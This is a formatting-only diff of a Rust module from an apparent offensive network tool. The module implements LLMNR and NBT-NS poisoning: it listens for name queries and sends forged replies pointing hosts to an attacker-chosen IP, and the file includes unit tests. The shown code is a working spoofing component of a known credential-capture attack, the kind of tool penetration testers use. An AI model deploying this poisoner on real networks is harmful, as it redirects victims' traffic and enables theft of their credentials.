@@ -10,8 +10,8 @@
 
 use crate::{AttackMode, RelayError, Result};
 use std::net::{Ipv4Addr, UdpSocket};
-use std::sync::atomic::{AtomicBool, Ordering};
 use std::sync::Arc;
+use std::sync::atomic::{AtomicBool, Ordering};
 use std::thread;
 use std::time::Duration;
 use tracing::{debug, error, info, warn};
@@ -111,16 +111,16 @@ pub fn parse_nbns_name(data: &[u8]) -> Option<String> {
     if data.is_empty() || data[0] as usize > data.len() - 1 {
         return None;
     }
-    
+
     let name_len = data[0] as usize;
     if name_len != 32 {
         return None; // NetBIOS names are always 32 bytes encoded
     }
-    
+
     // Decode the NetBIOS name (each byte represents two hex nibbles)
     let encoded = &data[1..=32];
     let mut decoded = String::new();
-    
+
     for chunk in encoded.chunks(2) {
         if chunk.len() == 2 {
             let high = (chunk[0] - b'A') << 4;
@@ -131,7 +131,7 @@ pub fn parse_nbns_name(data: &[u8]) -> Option<String> {
             }
         }
     }
-    
+
     Some(decoded.trim_end().to_string())
 }
 
@@ -139,17 +139,17 @@ pub fn parse_nbns_name(data: &[u8]) -> Option<String> {
 pub fn encode_nbns_name(name: &str) -> Vec<u8> {
     let name = format!("{:<15}", name); // Pad to 15 chars
     let name = format!("{}{}", name, { ' ' }); // Add type byte (space = workstation)
-    
+
     let mut encoded = Vec::with_capacity(34);
     encoded.push(32); // Length byte
-    
+
     for byte in name.bytes().take(16) {
         let high = (byte >> 4) + b'A';
         let low = (byte & 0x0F) + b'A';
         encoded.push(high);
         encoded.push(low);
     }
-    
+
     encoded.push(0); // Terminator
     encoded
 }
@@ -225,11 +225,9 @@ impl Poisoner {
     pub fn new(config: PoisonerConfig) -> Result<Self> {
         // Validate poison IP
         if config.poison_ip.parse::<Ipv4Addr>().is_err() {
-            return Err(RelayError::Config(format!(
-                "Invalid poison IP: {}",
-                config.poison_ip
-            ))
-            .into());
+            return Err(
+                RelayError::Config(format!("Invalid poison IP: {}", config.poison_ip)).into(),
+            );
         }
 
         Ok(Self {
@@ -357,7 +355,7 @@ impl Poisoner {
         // Join multicast group
         let multicast: Ipv4Addr = LLMNR_MULTICAST;
         let local: Ipv4Addr = listen_ip.parse().unwrap_or(Ipv4Addr::UNSPECIFIED);
-        
+
         socket
             .join_multicast_v4(&multicast, &local)
             .map_err(|e| RelayError::Socket(format!("Failed to join LLMNR multicast: {}", e)))?;
@@ -394,13 +392,14 @@ impl Poisoner {
 
                         // Check if we should poison this query
                         let should_poison = target_hosts.is_empty()
-                            || target_hosts.iter().any(|t| {
-                                query_name.to_lowercase().contains(&t.to_lowercase())
-                            });
+                            || target_hosts
+                                .iter()
+                                .any(|t| query_name.to_lowercase().contains(&t.to_lowercase()));
 
                         if should_poison && !analyze_only {
                             // Send poisoned response
-                            if let Ok(response) = Self::build_llmnr_response(&buf[..len], poison_ip) {
+                            if let Ok(response) = Self::build_llmnr_response(&buf[..len], poison_ip)
+                            {
                                 if let Err(e) = socket.send_to(&response, src) {
                                     warn!("Failed to send LLMNR response: {}", e);
                                 } else {
@@ -462,12 +461,11 @@ impl Poisoner {
 
     /// Build LLMNR response with poisoned IP
     fn build_llmnr_response(query: &[u8], poison_ip: &str) -> Result<Vec<u8>> {
-        let header = LlmnrHeader::parse(query).ok_or_else(|| {
-            RelayError::Protocol("Invalid LLMNR query".to_string())
-        })?;
+        let header = LlmnrHeader::parse(query)
+            .ok_or_else(|| RelayError::Protocol("Invalid LLMNR query".to_string()))?;
 
         let mut response = Vec::new();
-        
+
         // Response header
         response.extend_from_slice(&header.response().to_bytes());
 
@@ -502,9 +500,9 @@ impl Poisoner {
         // RDLENGTH
         response.extend_from_slice(&4u16.to_be_bytes());
         // RDATA (IPv4 address)
-        let ip: Ipv4Addr = poison_ip.parse().map_err(|_| {
-            RelayError::Config(format!("Invalid poison IP: {}", poison_ip))
-        })?;
+        let ip: Ipv4Addr = poison_ip
+            .parse()
+            .map_err(|_| RelayError::Config(format!("Invalid poison IP: {}", poison_ip)))?;
         response.extend_from_slice(&ip.octets());
 
         Ok(response)
@@ -563,13 +561,14 @@ impl Poisoner {
 
                         // Check if we should poison
                         let should_poison = target_hosts.is_empty()
-                            || target_hosts.iter().any(|t| {
-                                query_name.to_lowercase().contains(&t.to_lowercase())
-                            });
+                            || target_hosts
+                                .iter()
+                                .any(|t| query_name.to_lowercase().contains(&t.to_lowercase()));
 
                         if should_poison && !analyze_only {
                             // Send poisoned response
-                            if let Ok(response) = Self::build_nbtns_response(&buf[..len], poison_ip) {
+                            if let Ok(response) = Self::build_nbtns_response(&buf[..len], poison_ip)
+                            {
                                 if let Err(e) = socket.send_to(&response, src) {
                                     warn!("Failed to send NBT-NS response: {}", e);
                                 } else {
@@ -642,9 +641,9 @@ impl Poisoner {
         // Flags (group name, B-node)
         response.extend_from_slice(&0x0000u16.to_be_bytes());
         // IP address
-        let ip: Ipv4Addr = poison_ip.parse().map_err(|_| {
-            RelayError::Config(format!("Invalid poison IP: {}", poison_ip))
-        })?;
+        let ip: Ipv4Addr = poison_ip
+            .parse()
+            .map_err(|_| RelayError::Config(format!("Invalid poison IP: {}", poison_ip)))?;
         response.extend_from_slice(&ip.octets());
 
         Ok(response)
@@ -673,7 +672,9 @@ mod tests {
 
     #[test]
     fn test_llmnr_header() {
-        let query = [0x00, 0x01, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00];
+        let query = [
+            0x00, 0x01, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+        ];
         let header = LlmnrHeader::parse(&query).unwrap();
         assert!(header.is_query());
         assert_eq!(header.transaction_id, 1);
@@ -688,7 +689,7 @@ mod tests {
     fn test_nbns_name_encoding() {
         let encoded = encode_nbns_name("WPAD");
         assert!(!encoded.is_empty());
-        
+
         // First byte should be length (32)
         assert_eq!(encoded[0], 32);
     }
@@ -723,14 +724,13 @@ mod tests {
             0x00, 0x00, // Answers
             0x00, 0x00, // Authority
             0x00, 0x00, // Additional
-            0x04, b't', b'e', b's', b't',
-            0x00, // End of name
+            0x04, b't', b'e', b's', b't', 0x00, // End of name
             0x00, 0x01, // Type A
             0x00, 0x01, // Class IN
         ];
 
         let response = Poisoner::build_llmnr_response(&query, "192.168.1.100").unwrap();
-        
+
         // Check transaction ID copied
         assert_eq!(response[0..2], [0x00, 0x01]);
         // Check QR flag set (response)
